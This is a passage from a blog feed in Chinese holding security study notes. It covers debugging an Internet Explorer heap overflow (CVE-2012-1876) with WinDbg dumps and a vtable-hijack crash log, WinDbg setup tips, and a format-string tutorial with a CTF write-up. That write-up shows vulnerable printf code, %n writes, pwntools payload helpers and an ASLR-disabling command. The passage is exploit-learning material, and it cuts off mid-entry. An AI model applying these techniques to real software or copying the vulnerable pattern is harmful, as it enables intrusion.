00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b650  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b660  00 00 00 00 00 00 00 00-00 00 00 00 88 b6 f2 03  ................</span><br><span class="line">03f2b670  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b680  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b690  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b6a0  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">03f2b6b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b6c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b6d0  00 00 00 00 00 00 00 00-f2 10 d1 01 00 00 00 c2  ................</span><br><span class="line">03f2b6e0  a4 30 a9 03 00 00 00 00-02 00 00 00 1c 00 02 05  .0..............</span><br><span class="line">03f2b6f0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b700  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b710  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b720  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b730  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b740  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b750  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b760  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b770  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b780  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b790  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b7a0  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b7b0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b7c0  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b7d0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b7e0  45 00 45 00 41 00 45 00-48 00 01 00 45 00 00 00  E.E.A.E.H...E...</span><br><span class="line">03f2b7f0  d7 10 d1 01 00 00 00 c2-0c 61 81 04 00 00 00 00  .........a......</span><br><span class="line">03f2b800  02 00 00 00 18 00 02 05-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2b810  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b820  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b830  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b840  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b850  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b860  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b870  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b880  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b890  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8a0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8b0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8c0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8d0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b900  41 00 41 00 41 00 00 00-08 11 d1 01 00 00 00 c2  A.A.A...........</span><br><span class="line">03f2b910  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2b920  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2b930  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b940  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b950  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b960  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b970  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b980  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b990  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9c0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2ba00  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2ba10  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">03f2ba20  6d 11 d1 01 00 00 00 c2-c0 6a 81 04 00 00 00 00  m........j......</span><br><span class="line">03f2ba30  02 00 00 00 1c 00 02 05-f8 3a 8d 68 10 0b 37 01  .........:.h..7.</span><br><span class="line">03f2ba40  50 91 ef 03 90 3c 8d 68-01 00 00 00 00 00 00 00  P....&lt;.h........</span><br><span class="line">03f2ba50  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2ba60  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">03f2ba70  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2ba80  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">03f2ba90  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2baa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bab0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bac0  00 00 00 00 00 00 00 00-00 00 00 00 e8 ba f2 03  ................</span><br><span class="line">03f2bad0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bae0  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2baf0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb00  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">03f2bb10  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb20  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb30  00 00 00 00 00 00 00 00-4e 11 d1 01 00 00 00 c2  ........N.......</span><br><span class="line">03f2bb40  a4 30 a9 03 00 00 00 00-02 00 00 00 1c 00 02 05  .0..............</span><br><span class="line">03f2bb50  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb60  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2bb70  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2bb80  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2bb90  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2bba0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2bbb0  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2bbc0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2bbd0  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2bbe0  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2bbf0  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2bc00  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2bc10  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2bc20  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2bc30  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2bc40  45 00 45 00 41 00 45 00-48 00 01 00 45 00 00 00  E.E.A.E.H...E...</span><br><span class="line">03f2bc50  a3 11 d1 01 00 00 00 c2-0c 61 81 04 00 00 00 00  .........a......</span><br><span class="line">03f2bc60  02 00 00 00 18 00 02 05-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2bc70  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bc80  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bc90  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bca0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcb0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcc0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcd0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bce0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcf0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd00  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd10  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd20  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd30  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd40  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd50  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd60  41 00 41 00 41 00 00 00-84 11 d1 01 00 00 00 c2  A.A.A...........</span><br><span class="line">03f2bd70  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2bd80  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2bd90  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bda0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdb0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdc0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdd0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bde0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdf0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be00  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be10  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be20  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be30  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be40  42 00 42 00 42 00 42 00-42 00 42 00              B.B.B.B.B.B.</span><br></pre></td></tr></table></figure></p><p>很简单的能观察到03f2ae30的AAAA字符串被大量覆盖，所以它就是vulheap。<br>为做对比，我多打印了很多，下面的未被覆盖的AAAA都是成片出现的。</p><p><strong>不过对比漏洞战争书上，本来03f2b040地址处的fa被覆盖为48 00 01 00即0x00010048,这个覆盖看的出来（下图蓝色框线）.<br>按照0x03f2ae30+0x100(EEEE…)+0x8(堆指针大小）+0x100（AAAA…)+0x8(堆指针大小)=03f2b040,也确实应该是这里，我应该没理解错。</strong></p><p><strong>但是很奇怪，我的fa也还在……（下图红色框线），这可能就是我之前弹窗打印出的虚表地址不正确的原因吧，感觉别人的文章里都不会这样……难以理解</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-182936.png" alt=""></p><p>得到虚表地址后，计算mshtml基地址，构造rop。</p><p>然后再次溢出，这次溢出直接像刚刚覆盖BBBB的大小一样，直接覆盖虚表指针，于是就可以劫持虚表指针到任意地址，如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(6cc.7f8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=07070024---&gt;控制虚表指针 ebx=01000000 ecx=040f8910 edx=00000041 esi=0375f530 edi=040e0790</span><br><span class="line">eip=003d006b esp=0375f368 ebp=0375f3a0 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">003d006b 777a            ja      003d00e7                                [br=1]</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>调试poc的时候还是比较顺利的，在调exp那里各种卡壳，唉。<br>主要还是学到了一些windbg的使用吧。<br>比如如果要下断点，其实可以在html里插入数学函数，比如用Math.cos，然后在jscript!Cos下断。<br>比如要查看jscript的导出表，可以在windbg里用x jscript!* 来查找，找虚表可以使用类似的方法（见上文）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在调试漏洞战争上的CVE-2012-1876做了一些笔记，漏洞分析的话漏洞战争和vupen的文章已经写的很清楚了。&lt;br&gt;因为是第一次用wi
      
    
    </summary>
    
      <category term="读书笔记" scheme="http://eternalsakura13.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>windbg使用</title>
    <link href="http://eternalsakura13.com/2018/03/10/windbg/"/>
    <id>http://eternalsakura13.com/2018/03/10/windbg/</id>
    <published>2018-03-10T06:40:28.194Z</published>
    <updated>2018-03-10T17:47:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下windbg的使用。<br>1.字体<br><a href="https://bbs.pediy.com/thread-190640.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-190640.htm</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-064654.jpg" alt=""><br>2.!heap不能使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !heap</span><br><span class="line">*************************************************************************</span><br><span class="line">***                                                                   ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">***    Either you specified an unqualified symbol, or your debugger   ***</span><br><span class="line">***    doesn&apos;t have full symbol information.  Unqualified symbol      ***</span><br><span class="line">***    resolution is turned off by default. Please either specify a   ***</span><br><span class="line">***    fully qualified symbol module!symbolname, or enable resolution ***</span><br><span class="line">***    of unqualified symbols by typing &quot;.symopt- 100&quot;. Note that   ***</span><br><span class="line">***    enabling unqualified symbol resolution with network symbol     ***</span><br><span class="line">***    server shares in the symbol path may cause the debugger to     ***</span><br><span class="line">***    appear to hang for long periods of time when an incorrect      ***</span><br><span class="line">***    symbol name is typed or the network symbol server is down.     ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">***    For some commands to work properly, your symbol path           ***</span><br><span class="line">***    must point to .pdb files that have full type information.      ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">***    Certain .pdb files (such as the public OS symbols) do not      ***</span><br><span class="line">***    contain the required information.  Contact the group that      ***</span><br><span class="line">***    provided you with these symbols if you need this command to    ***</span><br><span class="line">***    work.                                                          ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">***    Type referenced: ntdll!_HEAP_ENTRY                             ***</span><br><span class="line">***                                                                   ***</span><br><span class="line">*************************************************************************</span><br><span class="line">Invalid type information</span><br></pre></td></tr></table></figure></p><p>解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.symfix</span><br><span class="line">.reload</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !heap</span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  1:   00270000                </span><br><span class="line">  2:   015e0000                </span><br><span class="line">  3:   00010000                </span><br><span class="line">  4:   00020000</span><br></pre></td></tr></table></figure><p>3.没有符号文件<br>在windbg的窗口里输入<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-072206.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下windbg的使用。&lt;br&gt;1.字体&lt;br&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-190640.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bbs.pediy.com/thread-1
      
    
    </summary>
    
      <category term="杂项" scheme="http://eternalsakura13.com/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞原理及湖湘杯pwn200 writeup</title>
    <link href="http://eternalsakura13.com/2018/03/05/pwn_fmtstr/"/>
    <id>http://eternalsakura13.com/2018/03/05/pwn_fmtstr/</id>
    <published>2018-03-05T14:31:57.765Z</published>
    <updated>2018-03-05T15:44:05.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>pwn题中，有形如下述代码的形式就是格式化字符串漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure></p><p>也许使用者的目的只是直接输出字符串，但是这段字符串来源于可控的输入，就造成了漏洞。<br>示例程序如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">  <span class="built_in">printf</span>(str)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译：<code>gcc -m32 -o str str.c</code><br>输入：<code>%2$x</code><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-142756.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-142805.jpg" alt=""><br>原因是如果直接printf(“占位符”)这种形式，就会把栈上的偏移当做数据输出出来。通过构造格式化串，就可以实现任意地址读和任意地址写。</p><h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>事实上，我们在scanf(或者read)来输入字符串的时候，字符串就已经在栈中了，如图，可以看出偏移为6。如果我们构造出<code>addr(4字节)%6$s</code>，就能读取这个地址的值了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-142854.jpg" alt=""><br>我们尝试一下，输入<code>AAAA%6$s</code>，当然不可能真的读到地址为41414141的内存值，不过从下图我框起来的内容就知道，如果我们输入一个合法的值，就可以读了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-142934.jpg" alt=""></p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>和上面的任意地址读是同理的，只不过利用了格式化字符串的一个比较冷门的特性，%n。<br>这个占位符可以把它前面输出的字符的数量，写入指定的地址。<br>比如<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"abc%n"</span>, &amp;val);</span><br></pre></td></tr></table></figure></p><p>val的值就被改变为3。</p><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a><a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="noopener">fmtstr</a></h4><p>上面说过我们要利用格式化串漏洞就要得到格式化串的偏移,pwntools有自动化代码可以得到这个偏移。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line"><span class="keyword">print</span> autofmt.offset</span><br></pre></td></tr></table></figure></p><h4 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h4><p>生成任意地址写的payload的函数.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;key: value&#125;)</span><br></pre></td></tr></table></figure></p><p>fmtstr_payload有两个参数</p><ul><li>第一个参数是int，用于表示取参数的偏移个数</li><li>第二个参数是字典，字典的意义是往key的地址，写入value的值</li></ul><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn200" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn200</a></p><h2 id="打开IDA跟入调试"><a href="#打开IDA跟入调试" class="headerlink" title="打开IDA跟入调试"></a>打开IDA跟入调试</h2><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnq89d4w5qj30m40biabl.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fnq88fzh3pj30w00r8afi.jpg" alt=""><br>形如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char buf[100]</span><br><span class="line">scanf(&quot;%s&quot;,buf);</span><br><span class="line">printf(buf);</span><br></pre></td></tr></table></figure></p><p><strong>找到格式化字符串漏洞</strong></p><h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><h3 id="checksec查看保护"><a href="#checksec查看保护" class="headerlink" title="checksec查看保护"></a>checksec查看保护</h3><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fnq8hv6sgdj30i8080jsr.jpg" alt=""><br><strong>tips1</strong><br>查看本机ASLR<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnq8kg22vwj30kb06smze.jpg" alt=""><br>so地址变动，确定本机开启了aslr<br>关闭ASLR<br><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br>确认关闭<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnq8nmhuy3j30jc067gmz.jpg" alt=""></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf(&amp;buf);</span><br><span class="line">puts(&quot;GET YOUR AGE:\n&quot;);</span><br><span class="line">read(0, &amp;buf, 0x40u);</span><br><span class="line">if ( atoi(&amp;buf) &gt; 60 )</span><br><span class="line">  puts(&quot;OLD 